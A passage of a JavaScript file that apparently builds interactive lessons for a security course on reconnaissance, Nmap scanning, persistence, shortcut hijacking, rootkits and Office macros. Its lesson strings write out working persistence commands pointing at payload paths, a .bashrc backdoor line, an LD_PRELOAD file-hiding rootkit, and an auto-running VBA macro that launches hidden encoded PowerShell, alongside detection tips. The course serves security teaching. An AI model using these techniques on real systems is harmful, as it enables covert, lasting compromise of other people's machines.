            tools: 'DNS RECONNAISSANCE TOOLS:\n\n┌─────────────────────────────────────┐\n│ DNSRECON                            │\n│ $ dnsrecon -d example.com           │\n│ • Zone transfer attempt             │\n│ • Standard record enum              │\n│ • Brute force subdomains            │\n├─────────────────────────────────────┤\n│ DNSENUM                             │\n│ $ dnsenum example.com               │\n│ • Google scraping                   │\n│ • Zone transfer                     │\n│ • Reverse lookups                   │\n├─────────────────────────────────────┤\n│ FIERCE                              │\n│ $ fierce --domain example.com       │\n│ • Find non-contiguous IP space      │\n│ • Subdomain enumeration             │\n├─────────────────────────────────────┤\n│ SUBFINDER                           │\n│ $ subfinder -d example.com          │\n│ • Passive subdomain discovery       │\n│ • Multiple data sources             │\n├─────────────────────────────────────┤\n│ AMASS                               │\n│ $ amass enum -d example.com         │\n│ • Comprehensive OSINT               │\n│ • Network mapping                   │\n└─────────────────────────────────────┘'
        };
        $('#dnsReconOut').textContent = data.records;
        $$('#dnsReconTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#dnsReconTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dnsReconOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 30: nmap-scanning - Nmap Scanning
    function demoNmapScanning(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">SCAN</span><span class="demo-title">Nmap Scanning</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="nmapTabs">
                <button class="demo-btn demo-btn-sm active" data-t="basic">Basic Scans</button>
                <button class="demo-btn demo-btn-sm" data-t="advanced">Advanced</button>
                <button class="demo-btn demo-btn-sm" data-t="scripts">NSE Scripts</button>
            </div>
            <div id="nmapOut" style="background:#0d1117;color:#ff7b72;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            basic: 'NMAP BASIC SCANNING:\n\nNetwork Mapper - The #1 port scanner\n\n# Basic scan (top 1000 ports)\n$ nmap 192.168.1.1\n\n# Scan specific ports\n$ nmap -p 22,80,443 192.168.1.1\n\n# Scan port range\n$ nmap -p 1-1000 192.168.1.1\n\n# Scan all 65535 ports\n$ nmap -p- 192.168.1.1\n\n# Fast scan (top 100 ports)\n$ nmap -F 192.168.1.1\n\n# Scan multiple hosts\n$ nmap 192.168.1.1-254\n$ nmap 192.168.1.0/24\n\n# Service/version detection\n$ nmap -sV 192.168.1.1\n\n# OS detection\n$ nmap -O 192.168.1.1\n\n# Aggressive scan (LOUD!)\n$ nmap -A 192.168.1.1',
            advanced: 'NMAP ADVANCED SCANNING:\n\nSCAN TYPES:\n  -sS  TCP SYN (stealth, default)\n  -sT  TCP Connect (full handshake)\n  -sU  UDP scan (slow!)\n  -sA  ACK scan (firewall rules)\n  -sN  NULL scan (no flags)\n  -sF  FIN scan (FIN flag)\n  -sX  Xmas scan (FIN+PSH+URG)\n\nTIMING:\n  -T0  Paranoid (slowest)\n  -T1  Sneaky\n  -T2  Polite\n  -T3  Normal (default)\n  -T4  Aggressive\n  -T5  Insane (fastest)\n\nEVASION:\n  -D RND:10       # Decoy IPs\n  --source-port 53 # Spoof source\n  -f              # Fragment packets\n  --data-length 25 # Random data\n\nOUTPUT:\n  -oN normal.txt   # Normal output\n  -oX scan.xml     # XML output\n  -oG grep.txt     # Grepable\n  -oA basename     # All formats',
            scripts: 'NMAP SCRIPTING ENGINE (NSE):\n\n# List available scripts\n$ ls /usr/share/nmap/scripts/\n\n# Run default scripts\n$ nmap -sC 192.168.1.1\n\n# Specific script\n$ nmap --script=http-headers 192.168.1.1\n\n# Script category\n$ nmap --script=vuln 192.168.1.1\n\nSCRIPT CATEGORIES:\n  auth     - Authentication\n  broadcast- Broadcast discovery\n  default  - Default safe scripts\n  discovery- Information gathering\n  dos      - Denial of service (careful!)\n  exploit  - Active exploitation\n  fuzzer   - Fuzzing attacks\n  intrusive- May crash services\n  malware  - Malware detection\n  safe     - Non-intrusive\n  version  - Version detection\n  vuln     - Vulnerability detection\n\nUSEFUL SCRIPTS:\n  http-enum, smb-enum-shares,\n  ftp-anon, ssh-auth-methods,\n  ssl-heartbleed, smb-vuln-ms17-010'
        };
        $('#nmapOut').textContent = data.basic;
        $$('#nmapTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#nmapTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#nmapOut').textContent = data[b.dataset.t];
            };
        });
    }

    // Backward compatibility for demoRecon
    function demoRecon(pane) { demoReconIntro(pane); }

    /* ============================================================
       C10: NETWORK INFILTRATION DEMOS
       ============================================================ */

    // C10 Lesson 1: persistence-intro - Introduction to Persistence
    function demoPersistenceIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">PERSISTENCE</span><span class="demo-title">Introduction to Persistence</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="persIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What Is It?</button>
                <button class="demo-btn demo-btn-sm" data-t="why">Why Attackers Need It</button>
                <button class="demo-btn demo-btn-sm" data-t="techniques">Technique Overview</button>
                <button class="demo-btn demo-btn-sm" data-t="mitre">MITRE ATT&CK</button>
            </div>
            <div id="persIntroOut" style="background:#1a1a1a;color:#ff4444;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS PERSISTENCE?\n\n╔═══════════════════════════════════════════════════════╗\n║  Persistence = Maintaining access after initial       ║\n║  compromise, surviving reboots and user logouts       ║\n╚═══════════════════════════════════════════════════════╝\n\nDefinition:\n  Techniques that adversaries use to keep access\n  to systems across restarts, credential changes,\n  and other interruptions.\n\nPersistence Timeline:\n  ┌─────────┐    ┌──────────┐    ┌─────────────┐\n  │ Initial │───▶│ Persist  │───▶│ Maintain    │\n  │ Access  │    │ Implant  │    │ Long-term   │\n  └─────────┘    └──────────┘    └─────────────┘\n\nKey Characteristics:\n  • Survives system reboots\n  • Automatic execution on startup\n  • Often hidden from users\n  • May use legitimate system features',
            why: 'WHY ATTACKERS NEED PERSISTENCE:\n\n1. INVESTMENT PROTECTION\n   ───────────────────────\n   Initial access is expensive (time, resources)\n   Losing access = Starting from scratch\n\n2. LONG-TERM OBJECTIVES\n   ───────────────────────\n   • Data exfiltration over time\n   • Lateral movement planning\n   • Waiting for high-value events\n   • Monitoring user activity\n\n3. OPERATIONAL CONTINUITY\n   ───────────────────────\n   Systems reboot, users logout, IPs change\n   Persistence survives these disruptions\n\n4. STEALTH OPERATIONS\n   ───────────────────────\n   Low-and-slow approach to avoid detection\n   Small actions over extended periods\n\n⚠️ APT groups average 200+ days in networks\n⚠️ Persistence enables long dwell times',
            techniques: 'PERSISTENCE TECHNIQUE CATEGORIES:\n\n┌─────────────────────────────────────────────────────┐\n│ BOOT/AUTO-START EXECUTION                           │\n├─────────────────────────────────────────────────────┤\n│ • Registry Run Keys    • Startup Folders            │\n│ • Scheduled Tasks      • Services                   │\n│ • Boot Records         • Login Scripts              │\n└─────────────────────────────────────────────────────┘\n\n┌─────────────────────────────────────────────────────┐\n│ HIJACKING EXECUTION FLOW                            │\n├─────────────────────────────────────────────────────┤\n│ • DLL Search Order     • Shortcut Modification      │\n│ • Path Interception    • Executable Installers      │\n└─────────────────────────────────────────────────────┘\n\n┌─────────────────────────────────────────────────────┐\n│ ACCOUNT MANIPULATION                                │\n├─────────────────────────────────────────────────────┤\n│ • Create Account       • SSH Keys                   │\n│ • Valid Accounts       • Web Shell                  │\n└─────────────────────────────────────────────────────┘',
            mitre: 'MITRE ATT&CK PERSISTENCE (TA0003):\n\n ID            Technique               Platforms\n ─────────────────────────────────────────────────\n T1547         Boot/Logon Autostart   Win/Lin/Mac\n T1053         Scheduled Task/Job     Win/Lin/Mac\n T1543         Create/Modify Service  Win/Lin/Mac\n T1546         Event Triggered Exec   Win/Lin/Mac\n T1574         Hijack Execution Flow  Win/Lin/Mac\n T1136         Create Account         Win/Lin/Mac\n T1556         Modify Auth Process    Win/Lin/Mac\n T1505         Server Software Comp   Win/Lin\n T1542         Pre-OS Boot            Win/Lin\n T1078         Valid Accounts         All\n\nDetection Priorities:\n  🔴 High: Registry Run Keys, Services\n  🟡 Medium: Scheduled Tasks, Startup\n  🟢 Low: Account creation (with monitoring)\n\n📊 Most common: T1547, T1053, T1543'
        };
        $('#persIntroOut').textContent = data.what;
        $$('#persIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#persIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#persIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 2: persistence-mechanisms - Persistence Mechanisms
    function demoPersistenceMechanisms(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">MECHANISMS</span><span class="demo-title">Persistence Mechanisms</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="persMechTabs">
                <button class="demo-btn demo-btn-sm active" data-t="registry">Registry Keys</button>
                <button class="demo-btn demo-btn-sm" data-t="schtasks">Scheduled Tasks</button>
                <button class="demo-btn demo-btn-sm" data-t="services">Services</button>
                <button class="demo-btn demo-btn-sm" data-t="wmi">WMI Subscriptions</button>
            </div>
            <div id="persMechOut" style="background:#1a1a1a;color:#ff4444;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            registry: 'REGISTRY PERSISTENCE KEYS:\n\n╔═══════════════════════════════════════════════════════╗\n║ COMMON RUN KEYS (Execute on Login)                    ║\n╚═══════════════════════════════════════════════════════╝\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKCU\\...\\RunOnce    (Executes once, then deleted)\nHKLM\\...\\RunOnce\n\nAdding Persistence:\n  reg add "HKCU\\Software\\Microsoft\\Windows\\\n    CurrentVersion\\Run" /v "SystemUpdate" \n    /t REG_SZ /d "C:\\malware\\payload.exe"\n\nQuery Run Keys:\n  reg query "HKCU\\...\\CurrentVersion\\Run"\n  reg query "HKLM\\...\\CurrentVersion\\Run"\n\n⚠️ HKLM requires admin, HKCU does not\n⚠️ Very common, heavily monitored by EDR',
            schtasks: 'SCHEDULED TASK PERSISTENCE:\n\nWindows Task Scheduler:\n  schtasks /create /tn "WindowsUpdate" \n    /tr "C:\\Users\\Public\\beacon.exe"\n    /sc ONLOGON /ru SYSTEM /f\n\n  schtasks /create /tn "DailyBackup"\n    /tr "powershell -ep bypass -f C:\\s.ps1"\n    /sc DAILY /st 02:00 /ru SYSTEM\n\nQuery Tasks:\n  schtasks /query /tn "WindowsUpdate" /v /fo LIST\n\n  Folder:      \\\n  TaskName:    WindowsUpdate\n  Status:      Ready\n  Run As User: SYSTEM\n  Schedule:    At logon\n\nLinux Cron:\n  * * * * * /tmp/backdoor.sh    # Every minute\n  @reboot /opt/persist.sh       # On boot\n  0 2 * * * /home/user/beacon   # Daily 2 AM',
            services: 'SERVICE PERSISTENCE:\n\nWindows Service Creation:\n  sc create "UpdateService" binpath= "C:\\mal.exe"\n     displayname= "Windows Update Service"\n     start= auto\n\n  sc config "UpdateService" start= auto\n  sc start "UpdateService"\n\nQuery Services:\n  sc query "UpdateService"\n\n  SERVICE_NAME: UpdateService\n  TYPE        : 10  WIN32_OWN_PROCESS\n  STATE       : 4  RUNNING\n  WIN32_EXIT  : 0\n\nLinux Systemd:\n  /etc/systemd/system/malware.service\n  ─────────────────────────────────────\n  [Unit]\n  Description=System Update\n\n  [Service]\n  ExecStart=/opt/backdoor\n  Restart=always\n\n  [Install]\n  WantedBy=multi-user.target\n\n  systemctl enable malware.service',
            wmi: 'WMI EVENT SUBSCRIPTIONS:\n\nPowerShell WMI Persistence:\n  $Filter = Set-WmiInstance -Class __EventFilter\n    -Namespace "root\\subscription"\n    -Arguments @{\n      Name = "WindowsUpdate";\n      EventNamespace = "root\\cimv2";\n      QueryLanguage = "WQL";\n      Query = "SELECT * FROM __InstanceModificationEvent\n               WITHIN 60 WHERE TargetInstance ISA\n               \'Win32_LocalTime\' AND\n               TargetInstance.Hour=2"\n    }\n\n  $Consumer = Set-WmiInstance -Class\n    CommandLineEventConsumer\n    -Arguments @{\n      Name = "UpdateConsumer";\n      CommandLineTemplate = "C:\\payload.exe"\n    }\n\n⚠️ Fileless persistence\n⚠️ Survives reboots\n⚠️ Difficult to detect\n⚠️ Requires admin rights'
        };
        $('#persMechOut').textContent = data.registry;
        $$('#persMechTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#persMechTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#persMechOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 3: startup-items-persist - Startup Items Persistence
    function demoStartupItemsPersist(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">STARTUP</span><span class="demo-title">Startup Items Persistence</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="startupTabs">
                <button class="demo-btn demo-btn-sm active" data-t="folders">Startup Folders</button>
                <button class="demo-btn demo-btn-sm" data-t="runkeys">Run Keys</button>
                <button class="demo-btn demo-btn-sm" data-t="shell">Shell Folders</button>
                <button class="demo-btn demo-btn-sm" data-t="linux">Linux Startup</button>
            </div>
            <div id="startupOut" style="background:#1a1a1a;color:#ff4444;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            folders: 'WINDOWS STARTUP FOLDERS:\n\n╔═══════════════════════════════════════════════════════╗\n║ Per-User Startup (No Admin Required)                  ║\n╚═══════════════════════════════════════════════════════╝\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\nC:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\\n  Start Menu\\Programs\\Startup\\\n\n╔═══════════════════════════════════════════════════════╗\n║ All Users Startup (Admin Required)                    ║\n╚═══════════════════════════════════════════════════════╝\n%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\\n  Programs\\Startup\\\n\nAdding Persistence:\n  copy malware.exe "%APPDATA%\\Microsoft\\Windows\\\n    Start Menu\\Programs\\Startup\\updater.exe"\n\n  # Or create shortcut to executable\n  $ws = New-Object -ComObject WScript.Shell\n  $s = $ws.CreateShortcut("$env:APPDATA\\...\\mal.lnk")\n  $s.TargetPath = "C:\\malware.exe"\n  $s.Save()',
            runkeys: 'REGISTRY RUN KEYS:\n\n╔═════════════════════════════════════════════════════╗\n║ Run Keys - Execute Every Login                      ║\n╚═════════════════════════════════════════════════════╝\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n╔═════════════════════════════════════════════════════╗\n║ RunOnce - Execute Once Then Delete                  ║\n╚═════════════════════════════════════════════════════╝\nHKCU\\...\\RunOnce\nHKLM\\...\\RunOnce\n\n╔═════════════════════════════════════════════════════╗\n║ RunServices - Legacy (Pre-Vista)                    ║\n╚═════════════════════════════════════════════════════╝\n\nCommands:\n  reg add HKCU\\...\\Run /v Updater /d "C:\\mal.exe"\n  reg query HKCU\\...\\Run\n  reg delete HKCU\\...\\Run /v Updater /f\n\nPowerShell:\n  Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\\n    Windows\\CurrentVersion\\Run" -Name "Update"\n    -Value "C:\\payload.exe"',
            shell: 'SHELL FOLDER HIJACKING:\n\nRegistry Shell Folders:\n  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\\n    Explorer\\Shell Folders\n  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\\n    Explorer\\User Shell Folders\n\nHijack Startup Location:\n  # Redirect "Startup" to attacker folder\n  reg add "HKCU\\...\\User Shell Folders"\n    /v Startup /t REG_EXPAND_SZ\n    /d "C:\\Users\\Public\\malicious_startup"\n\n  # Create folder with payload\n  mkdir C:\\Users\\Public\\malicious_startup\n  copy beacon.exe C:\\Users\\Public\\malicious_startup\\\n\nKey Folders to Hijack:\n  • Startup      → Auto-run on login\n  • Templates    → Document templates\n  • SendTo       → SendTo menu options\n\n⚠️ Less monitored than Run keys\n⚠️ Redirects legitimate folder checks\n⚠️ Persists through profile resets',
            linux: 'LINUX STARTUP PERSISTENCE:\n\n╔═════════════════════════════════════════════════════╗\n║ User-Level Persistence                              ║\n╚═════════════════════════════════════════════════════╝\n~/.bashrc        # Executes on bash login\n~/.bash_profile  # Login shells\n~/.profile       # Bourne shell login\n~/.config/autostart/  # Desktop autostart\n\nExample:\n  echo "/tmp/backdoor.sh &" >> ~/.bashrc\n\n╔═════════════════════════════════════════════════════╗\n║ System-Level Persistence                            ║\n╚═════════════════════════════════════════════════════╝\n/etc/profile          # All users login\n/etc/profile.d/*.sh   # Login scripts\n/etc/rc.local         # Boot (legacy)\n/etc/init.d/          # SysV init scripts\n\n╔═════════════════════════════════════════════════════╗\n║ Systemd Persistence                                 ║\n╚═════════════════════════════════════════════════════╝\n/etc/systemd/system/  # System services\n~/.config/systemd/user/  # User services\n\nsystemctl enable malware.service'
        };
        $('#startupOut').textContent = data.folders;
        $$('#startupTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#startupTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#startupOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 4: shortcut-hijacking - Shortcut Hijacking
    function demoShortcutHijacking(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">HIJACK</span><span class="demo-title">Shortcut Hijacking</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="shortcutTabs">
                <button class="demo-btn demo-btn-sm active" data-t="lnk">LNK File Basics</button>
                <button class="demo-btn demo-btn-sm" data-t="modify">Target Modification</button>
                <button class="demo-btn demo-btn-sm" data-t="icon">Icon Hijacking</button>
                <button class="demo-btn demo-btn-sm" data-t="detect">Detection</button>
            </div>
            <div id="shortcutOut" style="background:#1a1a1a;color:#ff4444;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            lnk: 'LNK FILE STRUCTURE:\n\n╔═══════════════════════════════════════════════════════╗\n║ Windows Shortcut (.lnk) Files                         ║\n╚═══════════════════════════════════════════════════════╝\n\nLNK File Components:\n  ┌─────────────────────────────────────────────┐\n  │ Header          │ Magic: 0x0000004C        │\n  ├─────────────────┼─────────────────────────│\n  │ Target Path     │ Points to executable     │\n  │ Working Dir     │ Execution directory      │\n  │ Arguments       │ Command line args        │\n  │ Icon Location   │ Display icon             │\n  │ Show Command    │ Normal/Min/Max           │\n  └─────────────────┴─────────────────────────┘\n\nCommon Shortcut Locations:\n  • Desktop\n  • Start Menu\n  • Quick Launch\n  • Taskbar pinned items\n  • Recent items\n\n⚠️ Users trust shortcuts - they look legitimate\n⚠️ Icon can mask malicious target',
            modify: 'SHORTCUT TARGET MODIFICATION:\n\nPowerShell - Modify Existing Shortcut:\n  $shell = New-Object -ComObject WScript.Shell\n  $shortcut = $shell.CreateShortcut(\n    "C:\\Users\\Public\\Desktop\\Chrome.lnk")\n\n  # Original target:\n  # C:\\Program Files\\Google\\Chrome\\chrome.exe\n\n  # Malicious modification:\n  $shortcut.TargetPath = "cmd.exe"\n  $shortcut.Arguments = "/c C:\\mal.exe & \n    \"C:\\Program Files\\Google\\Chrome\\chrome.exe\""\n  $shortcut.IconLocation = \n    "C:\\Program Files\\Google\\Chrome\\chrome.exe,0"\n  $shortcut.Save()\n\nExecution Flow:\n  User clicks Chrome → cmd.exe runs:\n    1. Execute malware (background)\n    2. Launch real Chrome (foreground)\n    = User sees Chrome, attacker gets shell\n\n⚠️ Legitimate app launches, user suspects nothing',
            icon: 'ICON HIJACKING TECHNIQUES:\n\n╔═══════════════════════════════════════════════════════╗\n║ Fake Application Icons                                ║\n╚═══════════════════════════════════════════════════════╝\n\nExtract Icon from Legitimate App:\n  [System.Drawing.Icon]::ExtractAssociatedIcon(\n    "C:\\Program Files\\Google\\Chrome\\chrome.exe"\n  ).ToBitmap().Save("chrome.ico")\n\nCreate Malicious Shortcut with Stolen Icon:\n  $shortcut.TargetPath = "C:\\Users\\Public\\mal.exe"\n  $shortcut.IconLocation = \n    "C:\\Program Files\\Google\\Chrome\\chrome.exe,0"\n  $shortcut.Save()\n\nUnicode Filename Tricks:\n  malware.exe      → Chrome[RLO]exe.pdf\n  (RLO = Right-to-Left Override U+202E)\n  Displays as: Chrome‮exe.pdf = Chromefdp.exe\n\n⚠️ Extension appears as PDF\n⚠️ Actually executable\n⚠️ Classic social engineering trick',
            detect: 'SHORTCUT HIJACKING DETECTION:\n\n╔═══════════════════════════════════════════════════════╗\n║ Detection Methods                                     ║\n╚═══════════════════════════════════════════════════════╝\n\n1. Parse LNK Files:\n   # PowerShell - Check shortcut targets\n   $shell = New-Object -ComObject WScript.Shell\n   Get-ChildItem "C:\\Users\\*\\Desktop\\*.lnk" |\n   ForEach-Object {\n     $s = $shell.CreateShortcut($_.FullName)\n     "$($_.Name): $($s.TargetPath) $($s.Arguments)"\n   }\n\n2. Monitor LNK Modifications:\n   • File integrity monitoring (FIM)\n   • Sysmon Event ID 11 (File Create)\n   • Compare against baseline\n\n3. Suspicious Indicators:\n   • Target = cmd.exe, powershell.exe\n   • Arguments contain encoded commands\n   • Icon doesn\'t match target\n   • Recent modification timestamp\n\n4. Tools:\n   • LECmd (Eric Zimmerman)\n   • LNK Parser\n   • Autoruns (Sysinternals)'
        };
        $('#shortcutOut').textContent = data.lnk;
        $$('#shortcutTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#shortcutTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#shortcutOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 5: rootkits - Rootkits
    function demoRootkits(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ROOTKIT</span><span class="demo-title">Rootkits</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="rootkitTabs">
                <button class="demo-btn demo-btn-sm active" data-t="usermode">User-Mode</button>
                <button class="demo-btn demo-btn-sm" data-t="kernel">Kernel-Mode</button>
                <button class="demo-btn demo-btn-sm" data-t="bootkit">Bootkits</button>
                <button class="demo-btn demo-btn-sm" data-t="detect">Detection</button>
            </div>
            <div id="rootkitOut" style="background:#1a1a1a;color:#ff4444;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            usermode: 'USER-MODE ROOTKITS:\n\n╔═══════════════════════════════════════════════════════╗\n║ Ring 3 - Application Level                            ║\n╚═══════════════════════════════════════════════════════╝\n\nTechniques:\n  • API Hooking (IAT/EAT patching)\n  • DLL Injection\n  • Process Hollowing\n  • LD_PRELOAD (Linux)\n\nLinux LD_PRELOAD Rootkit:\n  // hide_files.c\n  #define _GNU_SOURCE\n  #include <dirent.h>\n  #include <dlfcn.h>\n  \n  struct dirent* readdir(DIR *d) {\n    static struct dirent* (*orig)(DIR*) = NULL;\n    if(!orig) orig = dlsym(RTLD_NEXT, "readdir");\n    struct dirent* dir = orig(d);\n    while(dir && strstr(dir->d_name, "malware"))\n      dir = orig(d);  // Skip hidden files\n    return dir;\n  }\n\n  # Compile and use:\n  gcc -shared -fPIC -o hide.so hide_files.c -ldl\n  export LD_PRELOAD=/tmp/hide.so\n  ls  # malware* files now hidden!',
            kernel: 'KERNEL-MODE ROOTKITS:\n\n╔═══════════════════════════════════════════════════════╗\n║ Ring 0 - Kernel Level (Most Privileged)               ║\n╚═══════════════════════════════════════════════════════╝\n\nCapabilities:\n  • Hide processes from task manager\n  • Hide files from directory listings\n  • Hide network connections\n  • Intercept ALL system calls\n  • Keylogging at driver level\n\nLinux LKM (Loadable Kernel Module):\n  // Simple process hiding concept\n  #include <linux/module.h>\n  #include <linux/kernel.h>\n  \n  // Hook sys_getdents to filter process list\n  // Hide processes containing "malware"\n  \n  int init_module(void) {\n    // Replace syscall table entries\n    return 0;\n  }\n\nLoading:\n  insmod rootkit.ko   # Load module\n  lsmod               # May not appear (hidden)\n  rmmod rootkit       # Unload (if possible)\n\n⚠️ Full system control\n⚠️ Very difficult to detect from userspace',
            bootkit: 'BOOTKITS & FIRMWARE ROOTKITS:\n\n╔═══════════════════════════════════════════════════════╗\n║ Pre-OS Execution - Ultimate Persistence               ║\n╚═══════════════════════════════════════════════════════╝\n\nBoot Process:\n  ┌──────────┐   ┌──────────┐   ┌──────────┐\n  │ BIOS/    │──▶│ Bootldr  │──▶│ OS       │\n  │ UEFI     │   │ MBR/GPT  │   │ Kernel   │\n  └──────────┘   └──────────┘   └──────────┘\n       ↑              ↑              ↑\n   Firmware       Bootkit        Rootkit\n   Rootkit      (TDL4, etc)\n\nBootkit Types:\n  • MBR Infectors: Modify Master Boot Record\n  • VBR Infectors: Volume Boot Record\n  • UEFI Bootkits: EFI System Partition\n\nFirmware Rootkits:\n  • BIOS/UEFI implants\n  • Survive OS reinstall\n  • Survive disk replacement (!)\n\nExamples:\n  • TDL4/Alureon    • Mebromi (BIOS)\n  • Rovnix          • Hacking Team UEFI\n  • LoJax           • MosaicRegressor\n\n⚠️ Survives disk format and OS reinstall',
            detect: 'ROOTKIT DETECTION METHODS:\n\n╔═══════════════════════════════════════════════════════╗\n║ Detection Strategies                                  ║\n╚═══════════════════════════════════════════════════════╝\n\n1. CROSS-VIEW DETECTION\n   Compare API results vs raw disk/memory\n   If hidden = difference detected\n\n2. SIGNATURE-BASED\n   • YARA rules for known rootkits\n   • AV/EDR signature matching\n\n3. BEHAVIORAL ANALYSIS\n   • Hook detection\n   • System call monitoring\n   • Unexpected kernel modules\n\n4. MEMORY FORENSICS\n   Volatility Framework:\n     vol.py -f memory.dmp --profile=Win10\n       linux_check_syscall  # Hooked syscalls\n       linux_hidden_modules # Hidden LKMs\n       malfind              # Injected code\n       ssdt                 # SSDT hooks\n\n5. INTEGRITY VERIFICATION\n   • Secure Boot (UEFI)\n   • Measured Boot (TPM)\n   • AIDE/Tripwire (Linux)\n   • Windows KMCI/HVCI\n\nTools: GMER, RootkitRevealer, chkrootkit, rkhunter'
        };
        $('#rootkitOut').textContent = data.usermode;
        $$('#rootkitTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#rootkitTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#rootkitOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 6: office-persistence - Office Persistence
    function demoOfficePersistence(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">OFFICE</span><span class="demo-title">Office Persistence</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="officeTabs">
                <button class="demo-btn demo-btn-sm active" data-t="macros">VBA Macros</button>
                <button class="demo-btn demo-btn-sm" data-t="templates">Templates</button>
                <button class="demo-btn demo-btn-sm" data-t="addins">Add-ins</button>
                <button class="demo-btn demo-btn-sm" data-t="detect">Detection</button>
            </div>
            <div id="officeOut" style="background:#1a1a1a;color:#ff4444;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            macros: 'VBA MACRO PERSISTENCE:\n\n╔═══════════════════════════════════════════════════════╗\n║ Auto-Execute Macro Events                             ║\n╚═══════════════════════════════════════════════════════╝\n\nAuto-Run Events:\n  • AutoOpen()      - Document opened\n  • AutoClose()     - Document closed\n  • AutoExec()      - Application starts\n  • Document_Open() - Document opened (newer)\n\nExample Malicious Macro:\n  Sub AutoOpen()\n    Dim cmd As String\n    cmd = "powershell -ep bypass -w hidden -e "\n    cmd = cmd & "BASE64_ENCODED_PAYLOAD"\n    Shell cmd, vbHide\n  End Sub\n\nMacro-Enabled Extensions:\n  • .docm  - Word macro-enabled\n  • .xlsm  - Excel macro-enabled\n  • .pptm  - PowerPoint macro-enabled\n  • .doc   - Legacy (macros in binary)\n\n⚠️ Social engineering: "Enable Content"\n⚠️ Most common initial access vector',
